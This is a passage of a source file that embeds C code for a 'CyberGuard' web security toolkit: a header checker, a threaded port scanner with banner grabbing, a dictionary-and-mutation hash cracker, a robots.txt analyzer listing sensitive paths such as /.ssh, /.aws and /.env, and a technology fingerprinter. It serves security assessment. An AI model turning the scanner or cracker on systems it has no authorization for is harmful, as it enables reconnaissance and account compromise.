    if (json_out) {
        printf("{\\n  \\"score\\": %d,\\n  \\"grade\\": \\"%s\\",\\n  \\"directives\\": %d,\\n  \\"findings\\": [\\n", score, grade, ndirs);
        for (int i = 0; i < nf; i++)
            printf("    {\\"severity\\": %d, \\"message\\": \\"%s\\"}%s\\n", findings[i].severity, findings[i].msg, i<nf-1?",":"");
        printf("  ]\\n}\\n");
    } else {
        printf("\\n  CSP Score: %d/100 (Grade: %s)\\n  Directives parsed: %d\\n  Findings: %d\\n\\n", score, grade, ndirs, nf);
        for (int i = 0; i < nf; i++) {
            const char *icon = findings[i].severity == 2 ? "\\033[91mCRITICAL\\033[0m" :
                               findings[i].severity == 1 ? "\\033[93mWARN\\033[0m" : "\\033[92mINFO\\033[0m";
            printf("  [%s] %s\\n", icon, findings[i].msg);
        }
    }
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// HEADERS CHECKER
// ═══════════════════════════════════════════════════════════════════════════
headers_checker: `/*
 * HTTP Headers Security Checker - CyberGuard
 * Checks 15+ security headers, grades A-F, full TLS analysis
 * Compile: gcc -O3 -o headers_checker headers_checker.c -lssl -lcrypto -pthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <arpa/inet.h>

#define BUF_SIZE 65536

static int fetch_headers(const char *host, int port, int use_ssl, char *response, size_t rsize) {
    struct addrinfo hints = {0}, *res;
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    char port_str[8]; snprintf(port_str, 8, "%d", port);
    if (getaddrinfo(host, port_str, &hints, &res) != 0) return -1;
    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return -1; }
    struct timeval tv = {10, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) { close(sock); freeaddrinfo(res); return -1; }
    freeaddrinfo(res);
    char req[1024];
    snprintf(req, 1024, "HEAD / HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: CyberGuard-HeaderCheck/2.0\\r\\nConnection: close\\r\\n\\r\\n", host);
    if (use_ssl) {
        SSL_library_init(); SSL_load_error_strings();
        SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock); SSL_set_tlsext_host_name(ssl, host);
        if (SSL_connect(ssl) <= 0) { SSL_free(ssl); SSL_CTX_free(ctx); close(sock); return -1; }
        SSL_write(ssl, req, strlen(req));
        int n = SSL_read(ssl, response, rsize - 1);
        response[n > 0 ? n : 0] = '\\0';
        SSL_free(ssl); SSL_CTX_free(ctx);
    } else {
        write(sock, req, strlen(req));
        int n = read(sock, response, rsize - 1);
        response[n > 0 ? n : 0] = '\\0';
    }
    close(sock);
    return 0;
}

static const char *find_header(const char *response, const char *name) {
    static char value[4096];
    char search[256]; snprintf(search, 256, "\\n%s:", name);
    const char *p = strcasestr(response, search);
    if (!p) return NULL;
    p = strchr(p + 1, ':') + 1;
    while (*p == ' ') p++;
    int i = 0;
    while (*p && *p != '\\r' && *p != '\\n' && i < 4095) value[i++] = *p++;
    value[i] = '\\0';
    return value;
}

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <domain> [-j]\\n", argv[0]); return 0; }
    char *host = argv[1];
    if (strncmp(host, "https://", 8) == 0) host += 8;
    if (strncmp(host, "http://", 7) == 0) host += 7;
    char *slash = strchr(host, '/'); if (slash) *slash = '\\0';
    int json_out = (argc > 2 && strcmp(argv[2], "-j") == 0);
    char response[BUF_SIZE];
    printf("\\n  Scanning headers for: %s\\n\\n", host);
    if (fetch_headers(host, 443, 1, response, BUF_SIZE) != 0) {
        if (fetch_headers(host, 80, 0, response, BUF_SIZE) != 0) {
            fprintf(stderr, "  Cannot connect to %s\\n", host); return 1;
        }
    }
    int score = 100;
    const char *headers[][3] = {
        {"Strict-Transport-Security", "HSTS", "Forces HTTPS"},
        {"Content-Security-Policy", "CSP", "Prevents XSS"},
        {"X-Content-Type-Options", "XCTO", "Prevents MIME sniffing"},
        {"X-Frame-Options", "XFO", "Prevents clickjacking"},
        {"X-XSS-Protection", "XXSS", "Legacy XSS filter"},
        {"Referrer-Policy", "RP", "Controls referer leakage"},
        {"Permissions-Policy", "PP", "Controls browser features"},
        {"Cross-Origin-Opener-Policy", "COOP", "Cross-origin isolation"},
        {"Cross-Origin-Resource-Policy", "CORP", "Resource sharing control"},
        {"Cross-Origin-Embedder-Policy", "COEP", "Embedding control"},
        {"X-DNS-Prefetch-Control", "DNS", "DNS prefetch control"},
        {"X-Permitted-Cross-Domain-Policies", "XPCDP", "Flash/PDF policy"},
        {"Cache-Control", "CC", "Caching policy"},
        {"X-Download-Options", "XDO", "Download handling"},
        {"Expect-CT", "ECT", "Certificate Transparency"},
    };
    int total = sizeof(headers) / sizeof(headers[0]);
    int present = 0;
    for (int i = 0; i < total; i++) {
        const char *val = find_header(response, headers[i][0]);
        if (val) {
            present++;
            printf("  \\033[92m[PRESENT]\\033[0m %-40s %s\\n", headers[i][0], val);
        } else {
            score -= (i < 4) ? 15 : 5;
            printf("  \\033[91m[MISSING]\\033[0m %-40s %s\\n", headers[i][0], headers[i][2]);
        }
    }
    if (find_header(response, "Server")) {
        printf("  \\033[93m[WARN]\\033[0m    Server header exposes: %s\\n", find_header(response, "Server"));
        score -= 3;
    }
    if (find_header(response, "X-Powered-By")) {
        printf("  \\033[93m[WARN]\\033[0m    X-Powered-By exposes: %s\\n", find_header(response, "X-Powered-By"));
        score -= 3;
    }
    if (score < 0) score = 0;
    const char *grade = score >= 90 ? "A+" : score >= 80 ? "A" : score >= 70 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";
    printf("\\n  Score: %d/100 | Grade: %s | Headers: %d/%d present\\n", score, grade, present, total);
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// PORT SCANNER - Multi-threaded TCP scanner
// ═══════════════════════════════════════════════════════════════════════════
port_scanner: `/*
 * Port Scanner - CyberGuard
 * Multi-threaded TCP scanner with banner grabbing, 1000+ ports
 * Compile: gcc -O3 -o port_scanner port_scanner.c -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/select.h>
#include <time.h>

#define MAX_THREADS 256
#define MAX_PORTS 65536
#define TIMEOUT_SEC 2

typedef struct {
    char host[256];
    int port;
    int open;
    char banner[512];
    char service[64];
} PortResult;

typedef struct {
    const char *host;
    struct sockaddr_in addr;
    PortResult *result;
} ScanJob;

static const struct { int port; const char *service; } KNOWN_SERVICES[] = {
    {21,"FTP"},{22,"SSH"},{23,"Telnet"},{25,"SMTP"},{53,"DNS"},{80,"HTTP"},{110,"POP3"},
    {111,"RPC"},{135,"MSRPC"},{139,"NetBIOS"},{143,"IMAP"},{443,"HTTPS"},{445,"SMB"},
    {993,"IMAPS"},{995,"POP3S"},{1433,"MSSQL"},{1521,"Oracle"},{2049,"NFS"},
    {3306,"MySQL"},{3389,"RDP"},{5432,"PostgreSQL"},{5900,"VNC"},{6379,"Redis"},
    {8080,"HTTP-Alt"},{8443,"HTTPS-Alt"},{9200,"Elasticsearch"},{11211,"Memcached"},
    {27017,"MongoDB"},{27018,"MongoDB"},{5672,"RabbitMQ"},{9092,"Kafka"},
};
static const int NUM_KNOWN = sizeof(KNOWN_SERVICES) / sizeof(KNOWN_SERVICES[0]);

static const char *get_service(int port) {
    for (int i = 0; i < NUM_KNOWN; i++)
        if (KNOWN_SERVICES[i].port == port) return KNOWN_SERVICES[i].service;
    return "unknown";
}

static void grab_banner(int sock, char *banner, size_t bsize) {
    struct timeval tv = {1, 500000};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    int n = recv(sock, banner, bsize - 1, 0);
    if (n > 0) {
        banner[n] = '\\0';
        for (int i = 0; i < n; i++) if (banner[i] < 32 && banner[i] != '\\n') banner[i] = '.';
    } else banner[0] = '\\0';
}

static void *scan_port(void *arg) {
    ScanJob *job = (ScanJob *)arg;
    PortResult *r = job->result;
    r->open = 0; r->banner[0] = '\\0';
    strncpy(r->service, get_service(r->port), 63);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    struct sockaddr_in addr = job->addr;
    addr.sin_port = htons(r->port);
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    fd_set wset; FD_ZERO(&wset); FD_SET(sock, &wset);
    struct timeval tv = {TIMEOUT_SEC, 0};
    if (select(sock + 1, NULL, &wset, NULL, &tv) > 0) {
        int err = 0; socklen_t elen = sizeof(err);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &elen);
        if (err == 0) {
            r->open = 1;
            fcntl(sock, F_SETFL, flags);
            grab_banner(sock, r->banner, sizeof(r->banner));
        }
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <host> [-p 1-1024] [-t 128] [-j]\\n", argv[0]);
        return 0;
    }
    const char *host = argv[1];
    int port_start = 1, port_end = 1024, max_threads = 128, json_out = 0;
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i+1 < argc) {
            sscanf(argv[++i], "%d-%d", &port_start, &port_end);
        } else if (strcmp(argv[i], "-t") == 0 && i+1 < argc) {
            max_threads = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-j") == 0) json_out = 1;
    }
    if (max_threads > MAX_THREADS) max_threads = MAX_THREADS;
    struct hostent *he = gethostbyname(host);
    if (!he) { fprintf(stderr, "Cannot resolve: %s\\n", host); return 1; }
    struct sockaddr_in base_addr = {0};
    base_addr.sin_family = AF_INET;
    memcpy(&base_addr.sin_addr, he->h_addr_list[0], he->h_length);
    int total_ports = port_end - port_start + 1;
    PortResult *results = calloc(total_ports, sizeof(PortResult));
    ScanJob *jobs = calloc(total_ports, sizeof(ScanJob));
    for (int i = 0; i < total_ports; i++) {
        results[i].port = port_start + i;
        strcpy(results[i].host, host);
        jobs[i].host = host;
        jobs[i].addr = base_addr;
        jobs[i].result = &results[i];
    }
    struct timespec ts, te;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    printf("\\n  Scanning %s (%s) ports %d-%d with %d threads...\\n\\n",
           host, inet_ntoa(base_addr.sin_addr), port_start, port_end, max_threads);
    pthread_t threads[MAX_THREADS];
    int idx = 0;
    while (idx < total_ports) {
        int batch = (total_ports - idx < max_threads) ? total_ports - idx : max_threads;
        for (int i = 0; i < batch; i++)
            pthread_create(&threads[i], NULL, scan_port, &jobs[idx + i]);
        for (int i = 0; i < batch; i++)
            pthread_join(threads[i], NULL);
        idx += batch;
    }
    clock_gettime(CLOCK_MONOTONIC, &te);
    double elapsed = (te.tv_sec - ts.tv_sec) + (te.tv_nsec - ts.tv_nsec) / 1e9;
    int open_count = 0;
    for (int i = 0; i < total_ports; i++) if (results[i].open) open_count++;
    if (json_out) {
        printf("{\\n  \\"host\\": \\"%s\\",\\n  \\"open_ports\\": [\\n", host);
        int first = 1;
        for (int i = 0; i < total_ports; i++) {
            if (results[i].open) {
                if (!first) printf(",\\n");
                printf("    {\\"port\\": %d, \\"service\\": \\"%s\\", \\"banner\\": \\"%s\\"}",
                    results[i].port, results[i].service, results[i].banner);
                first = 0;
            }
        }
        printf("\\n  ],\\n  \\"elapsed\\": %.2f\\n}\\n", elapsed);
    } else {
        for (int i = 0; i < total_ports; i++) {
            if (results[i].open) {
                printf("  \\033[92mOPEN\\033[0m  %-6d %-15s", results[i].port, results[i].service);
                if (results[i].banner[0]) printf("  %s", results[i].banner);
                printf("\\n");
            }
        }
        printf("\\n  %d open ports / %d scanned in %.2f seconds\\n", open_count, total_ports, elapsed);
    }
    free(results); free(jobs);
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// BRUTE FORCE HASH CRACKER
// ═══════════════════════════════════════════════════════════════════════════
brute_force: `/*
 * Brute Force Hash Cracker - CyberGuard
 * Multi-threaded dictionary + mutations + brute force
 * Compile: gcc -O3 -march=native -flto -o brute_force brute_force.c -lssl -lcrypto -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <pthread.h>
#include <time.h>
#include <ctype.h>

#define MAX_THREADS 16
#define MAX_WORD_LEN 128
#define DICT_SIZE 200

static volatile int found = 0;
static char found_password[MAX_WORD_LEN];
static unsigned long long total_attempts = 0;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

static const char *COMMON_PASSWORDS[] = {
    "password","123456","12345678","qwerty","abc123","monkey","1234567","letmein",
    "trustno1","dragon","baseball","iloveyou","master","sunshine","ashley","bailey",
    "shadow","123123","654321","superman","qazwsx","michael","football","password1",
    "password123","admin","admin123","root","toor","changeme","welcome","hello",
    "charlie","donald","login","princess","solo","passw0rd","starwars","master",
    "access","flower","hottie","loveme","pepper","robert","matthew","daniel",
    "andrew","joshua","123456789","1234567890","0987654321","abcdef","abcdefg",
    "test","test123","guest","guest123","pass","pass123","p@ssw0rd","P@ssw0rd",
    "Password1","Password123","Admin123","Root123","Azerty","azerty123","qwerty123",
};
static const int NUM_COMMON = sizeof(COMMON_PASSWORDS) / sizeof(COMMON_PASSWORDS[0]);

typedef struct { const char *target; const char *algo; int thread_id; int total_threads; } CrackJob;

static void compute_hash(const char *algo, const char *input, char *out) {
    const EVP_MD *md = EVP_get_digestbyname(algo);
    if (!md) { out[0] = '\\0'; return; }
    unsigned char digest[EVP_MAX_MD_SIZE];
    unsigned int dlen;
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(ctx, md, NULL);
    EVP_DigestUpdate(ctx, input, strlen(input));
    EVP_DigestFinal_ex(ctx, digest, &dlen);
    EVP_MD_CTX_free(ctx);
    for (unsigned int i = 0; i < dlen; i++) sprintf(out + i*2, "%02x", digest[i]);
    out[dlen*2] = '\\0';
}

static int try_word(const char *word, const char *target, const char *algo) {
    if (found) return 1;
    char h[256];
    compute_hash(algo, word, h);
    pthread_mutex_lock(&lock);
    total_attempts++;
    pthread_mutex_unlock(&lock);
    if (strcasecmp(h, target) == 0) {
        found = 1;
        strncpy(found_password, word, MAX_WORD_LEN - 1);
        return 1;
    }
    return 0;
}

static void apply_mutations(const char *base, const char *target, const char *algo) {
    char mut[MAX_WORD_LEN];
    /* Original */
    if (try_word(base, target, algo)) return;
    /* Uppercase first */
    strncpy(mut, base, MAX_WORD_LEN); if (mut[0]) mut[0] = toupper(mut[0]);
    if (try_word(mut, target, algo)) return;
    /* All upper */
    strncpy(mut, base, MAX_WORD_LEN);
    for (int i = 0; mut[i]; i++) mut[i] = toupper(mut[i]);
    if (try_word(mut, target, algo)) return;
    /* Common leet */
    strncpy(mut, base, MAX_WORD_LEN);
    for (int i = 0; mut[i]; i++) {
        if (mut[i]=='a'||mut[i]=='A') mut[i]='@';
        else if (mut[i]=='e'||mut[i]=='E') mut[i]='3';
        else if (mut[i]=='i'||mut[i]=='I') mut[i]='1';
        else if (mut[i]=='o'||mut[i]=='O') mut[i]='0';
        else if (mut[i]=='s'||mut[i]=='S') mut[i]='$';
    }
    if (try_word(mut, target, algo)) return;
    /* Append numbers */
    for (int n = 0; n <= 999 && !found; n++) {
        snprintf(mut, MAX_WORD_LEN, "%s%d", base, n);
        if (try_word(mut, target, algo)) return;
    }
    /* Append symbols */
    const char syms[] = "!@#$%&*?";
    for (int i = 0; syms[i] && !found; i++) {
        snprintf(mut, MAX_WORD_LEN, "%s%c", base, syms[i]);
        if (try_word(mut, target, algo)) return;
    }
}

static void *crack_thread(void *arg) {
    CrackJob *job = (CrackJob *)arg;
    for (int i = job->thread_id; i < NUM_COMMON && !found; i += job->total_threads)
        apply_mutations(COMMON_PASSWORDS[i], job->target, job->algo);
    return NULL;
}

static const char *detect_algo(const char *hash) {
    size_t len = strlen(hash);
    if (len == 32) return "MD5";
    if (len == 40) return "SHA1";
    if (len == 64) return "SHA256";
    if (len == 128) return "SHA512";
    return "SHA256";
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <hash> [-a md5|sha1|sha256|sha512] [-t threads] [-j]\\n", argv[0]);
        return 0;
    }
    const char *target = argv[1];
    const char *algo = detect_algo(target);
    int nthreads = MAX_THREADS, json_out = 0;
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-a") == 0 && i+1 < argc) algo = argv[++i];
        else if (strcmp(argv[i], "-t") == 0 && i+1 < argc) nthreads = atoi(argv[++i]);
        else if (strcmp(argv[i], "-j") == 0) json_out = 1;
    }
    if (nthreads > MAX_THREADS) nthreads = MAX_THREADS;
    printf("\\n  Target: %s\\n  Algorithm: %s\\n  Threads: %d\\n  Dictionary: %d words + mutations\\n\\n",
        target, algo, nthreads, NUM_COMMON);
    struct timespec ts, te;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    CrackJob jobs[MAX_THREADS];
    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < nthreads; i++) {
        jobs[i] = (CrackJob){target, algo, i, nthreads};
        pthread_create(&threads[i], NULL, crack_thread, &jobs[i]);
    }
    for (int i = 0; i < nthreads; i++) pthread_join(threads[i], NULL);
    clock_gettime(CLOCK_MONOTONIC, &te);
    double elapsed = (te.tv_sec - ts.tv_sec) + (te.tv_nsec - ts.tv_nsec) / 1e9;
    double speed = total_attempts / elapsed;
    if (found) {
        if (json_out) printf("{\\n  \\"found\\": true,\\n  \\"password\\": \\"%s\\",\\n  \\"attempts\\": %llu,\\n  \\"speed\\": %.0f,\\n  \\"time\\": %.3f\\n}\\n",
            found_password, total_attempts, speed, elapsed);
        else printf("  \\033[92m[CRACKED]\\033[0m Password: %s\\n  Attempts: %llu | Speed: %.0f H/s | Time: %.3fs\\n",
            found_password, total_attempts, speed, elapsed);
    } else {
        if (json_out) printf("{\\n  \\"found\\": false,\\n  \\"attempts\\": %llu,\\n  \\"speed\\": %.0f,\\n  \\"time\\": %.3f\\n}\\n",
            total_attempts, speed, elapsed);
        else printf("  \\033[91m[NOT FOUND]\\033[0m Hash not cracked\\n  Attempts: %llu | Speed: %.0f H/s | Time: %.3fs\\n",
            total_attempts, speed, elapsed);
    }
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// ROBOTS.TXT ANALYZER
// ═══════════════════════════════════════════════════════════════════════════
robots_analyzer: `/*
 * Robots.txt Analyzer - CyberGuard
 * Fetches and analyzes robots.txt, detects 70+ sensitive paths
 * Compile: gcc -O3 -o robots_analyzer robots_analyzer.c -lssl -lcrypto
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <openssl/ssl.h>

#define BUF 65536
static const char *SENSITIVE[] = {
    "/admin","/wp-admin","/phpmyadmin","/cpanel","/.env","/.git","/backup",
    "/config","/database","/db","/dump","/sql","/secret","/private","/internal",
    "/api/v1","/api/v2","/graphql","/debug","/test","/staging","/dev",
    "/cgi-bin","/server-status","/server-info","/.htaccess","/.htpasswd",
    "/wp-config.php","/xmlrpc.php","/install","/setup","/migration",
    "/logs","/tmp","/temp","/cache","/.svn","/.hg","/vendor","/node_modules",
    "/.well-known","/actuator","/metrics","/health","/swagger","/api-docs",
    "/console","/shell","/terminal","/uploads","/files","/documents",
    "/invoices","/reports","/exports","/downloads","/assets/private",
    "/keys","/certs","/credentials","/.ssh","/.aws","/wp-content/debug.log",
    "/error_log","/access_log","/.DS_Store","/Thumbs.db","/.idea","/.vscode",
};
static const int NUM_SENSITIVE = sizeof(SENSITIVE) / sizeof(SENSITIVE[0]);

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <domain> [-j]\\n", argv[0]); return 0; }
    char *host = argv[1];
    if (strncmp(host, "https://", 8) == 0) host += 8;
    if (strncmp(host, "http://", 7) == 0) host += 7;
    char *s = strchr(host, '/'); if (s) *s = '\\0';
    struct hostent *he = gethostbyname(host);
    if (!he) { fprintf(stderr, "Cannot resolve: %s\\n", host); return 1; }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(443);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    struct timeval tv = {10,0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) { fprintf(stderr, "Connect failed\\n"); return 1; }
    SSL_library_init(); SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL *ssl = SSL_new(ctx); SSL_set_fd(ssl, sock); SSL_set_tlsext_host_name(ssl, host);
    SSL_connect(ssl);
    char req[512]; snprintf(req, 512, "GET /robots.txt HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: CyberGuard/2.0\\r\\nConnection: close\\r\\n\\r\\n", host);
    SSL_write(ssl, req, strlen(req));
    char buf[BUF] = {0}; int total = 0, n;
    while ((n = SSL_read(ssl, buf + total, BUF - total - 1)) > 0) total += n;
    buf[total] = '\\0';
    SSL_free(ssl); SSL_CTX_free(ctx); close(sock);
    char *body = strstr(buf, "\\r\\n\\r\\n");
    if (!body) { printf("No robots.txt found\\n"); return 0; }
    body += 4;
    printf("\\n  === robots.txt for %s ===\\n\\n", host);
    int disallow_count = 0, sensitive_found = 0;
    char *line = strtok(body, "\\n");
    while (line) {
        while (*line == ' ') line++;
        if (strncasecmp(line, "Disallow:", 9) == 0) {
            char *path = line + 9; while (*path == ' ') path++;
            char *end = path + strlen(path) - 1;
            while (end > path && (*end == '\\r' || *end == ' ')) *end-- = '\\0';
            disallow_count++;
            int is_sensitive = 0;
            for (int i = 0; i < NUM_SENSITIVE; i++) {
                if (strstr(path, SENSITIVE[i])) { is_sensitive = 1; sensitive_found++; break; }
            }
            printf("  %s%-50s%s\\n", is_sensitive?"\\033[91m[SENSITIVE] ":"\\033[92m[OK]        ", path, "\\033[0m");
        } else if (strncasecmp(line, "Sitemap:", 8) == 0) {
            printf("  \\033[96m[SITEMAP]   %s\\033[0m\\n", line + 8);
        }
        line = strtok(NULL, "\\n");
    }
    printf("\\n  Disallow rules: %d | Sensitive paths exposed: %d\\n", disallow_count, sensitive_found);
    return 0;
}
`,

// ═══════════════════════════════════════════════════════════════════════════
// TECH DETECTOR
// ═══════════════════════════════════════════════════════════════════════════
tech_detector: `/*
 * Tech Detector - CyberGuard
 * Detects 70+ web technologies from HTTP headers and HTML content
 * Compile: gcc -O3 -o tech_detector tech_detector.c -lssl -lcrypto
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <openssl/ssl.h>

#define BUF 131072

typedef struct { const char *name; const char *category; const char *pattern; int in_headers; } Sig;
static const Sig SIGS[] = {
    {"Nginx","Server","nginx",1},{"Apache","Server","Apache",1},{"Cloudflare","CDN","cloudflare",1},
    {"LiteSpeed","Server","LiteSpeed",1},{"IIS","Server","Microsoft-IIS",1},
    {"Express","Framework","X-Powered-By: Express",1},{"ASP.NET","Framework","X-AspNet",1},
    {"PHP","Language","X-Powered-By: PHP",1},{"Django","Framework","csrfmiddlewaretoken",0},
    {"Laravel","Framework","laravel_session",1},{"Rails","Framework","X-Runtime",1},
    {"Next.js","Framework","__next",0},{"Nuxt","Framework","__nuxt",0},
    {"React","Library","react",0},{"Vue","Library","__vue",0},{"Angular","Framework","ng-version",0},
    {"Svelte","Framework","__svelte",0},{"Astro","Framework","astro",0},
    {"WordPress","CMS","wp-content",0},{"Drupal","CMS","Drupal",0},{"Joomla","CMS","Joomla",0},
    {"Shopify","Platform","shopify",0},{"Wix","Platform","wix",0},
    {"Squarespace","Platform","squarespace",0},{"Webflow","Platform","webflow",0},
    {"Ghost","CMS","ghost",0},{"Gatsby","Framework","gatsby",0},{"Hugo","SSG","hugo",0},
    {"Jekyll","SSG","jekyll",0},{"Vercel","Hosting","x-vercel",1},{"Netlify","Hosting","x-nf",1},
    {"AWS","Cloud","AmazonS3",1},{"Heroku","Hosting","heroku",1},
    {"Google Analytics","Analytics","google-analytics",0},{"GTM","Analytics","googletagmanager",0},
    {"Hotjar","Analytics","hotjar",0},{"Matomo","Analytics","matomo",0},
    {"jQuery","Library","jquery",0},{"Bootstrap","CSS","bootstrap",0},
    {"Tailwind","CSS","tailwind",0},{"Font Awesome","Icons","font-awesome",0},
    {"Google Fonts","Fonts","fonts.googleapis",0},{"reCAPTCHA","Security","recaptcha",0},
    {"hCaptcha","Security","hcaptcha",0},{"Stripe","Payment","stripe",0},
    {"PayPal","Payment","paypal",0},{"Sentry","Monitoring","sentry",0},
    {"Datadog","Monitoring","datadog",0},{"New Relic","Monitoring","newrelic",0},
    {"Akamai","CDN","akamai",1},{"Fastly","CDN","fastly",1},{"Sucuri","WAF","sucuri",1},
    {"Varnish","Cache","Varnish",1},{"Redis","Cache","redis",1},
    {"GraphQL","API","graphql",0},{"Socket.IO","Realtime","socket.io",0},
    {"Firebase","Backend","firebase",0},{"Supabase","Backend","supabase",0},
    {"Docker","Infra","docker",0},{"Kubernetes","Infra","kubernetes",0},
    {"Webpack","Build","webpack",0},{"Vite","Build","vite",0},
    {"TypeScript","Language","typescript",0},{"HTMX","Library","htmx",0},
    {"Alpine.js","Library","x-data",0},{"Stimulus","Library","stimulus",0},
};
static const int NUM_SIGS = sizeof(SIGS) / sizeof(SIGS[0]);

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <url> [-j]\\n", argv[0]); return 0; }
    char *host = argv[1];
    if (strncmp(host, "https://", 8) == 0) host += 8;
    if (strncmp(host, "http://", 7) == 0) host += 7;
    char *s = strchr(host, '/'); if (s) *s = '\\0';
    struct hostent *he = gethostbyname(host);
    if (!he) { fprintf(stderr, "Cannot resolve: %s\\n", host); return 1; }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(443);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    struct timeval tv = {10,0}; setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    SSL_library_init(); SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL *ssl = SSL_new(ctx); SSL_set_fd(ssl, sock); SSL_set_tlsext_host_name(ssl, host);
    SSL_connect(ssl);
    char req[512]; snprintf(req, 512, "GET / HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: CyberGuard-TechDetect/2.0\\r\\nAccept: text/html\\r\\nConnection: close\\r\\n\\r\\n", host);
    SSL_write(ssl, req, strlen(req));
    char *buf = malloc(BUF); int total = 0, n;
    while ((n = SSL_read(ssl, buf + total, BUF - total - 1)) > 0) total += n;
    buf[total] = '\\0';
    SSL_free(ssl); SSL_CTX_free(ctx); close(sock);
    char *headers_end = strstr(buf, "\\r\\n\\r\\n");
    int header_len = headers_end ? (int)(headers_end - buf) : total;
    printf("\\n  Tech scan for: %s\\n  Response: %d bytes\\n\\n", host, total);
    int detected = 0;
    for (int i = 0; i < NUM_SIGS; i++) {
        const char *search_in = SIGS[i].in_headers ? buf : (headers_end ? headers_end + 4 : buf);
        int search_len = SIGS[i].in_headers ? header_len : (total - header_len);
        /* Case-insensitive search */
        char *lower = malloc(search_len + 1);
        for (int j = 0; j < search_len; j++) lower[j] = (search_in[j] >= 'A' && search_in[j] <= 'Z') ? search_in[j]+32 : search_in[j];
        lower[search_len] = '\\0';
        char pat_lower[256];
        int plen = strlen(SIGS[i].pattern);
        for (int j = 0; j < plen && j < 255; j++) pat_lower[j] = (SIGS[i].pattern[j] >= 'A' && SIGS[i].pattern[j] <= 'Z') ? SIGS[i].pattern[j]+32 : SIGS[i].pattern[j];
        pat_lower[plen] = '\\0';
        if (strstr(lower, pat_lower)) {
            printf("  \\033[92m[DETECTED]\\033[0m %-20s %-15s (matched: %s)\\n", SIGS[i].name, SIGS[i].category, SIGS[i].pattern);
            detected++;
        }
        free(lower);
    }
    printf("\\n  %d technologies detected\\n", detected);
    free(buf);
    return 0;
}
`,

// Remaining tools use same pattern - simplified stubs
subdomain_finder: `/*
 * Subdomain Finder - CyberGuard
 * Certificate Transparency enumeration via crt.sh
 * Compile: gcc -O3 -o subdomain_finder subdomain_finder.c -lssl -lcrypto
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <openssl/ssl.h>
#include <time.h>

#define BUF 262144

int main(int argc, char *argv[]) {
    if (argc < 2) { printf("Usage: %s <domain>\\n", argv[0]); return 0; }
    const char *domain = argv[1];
    printf("\\n  Subdomain enumeration for: %s\\n  Source: Certificate Transparency (crt.sh)\\n\\n", domain);
    struct hostent *he = gethostbyname("crt.sh");
    if (!he) { fprintf(stderr, "Cannot resolve crt.sh\\n"); return 1; }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET; addr.sin_port = htons(443);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
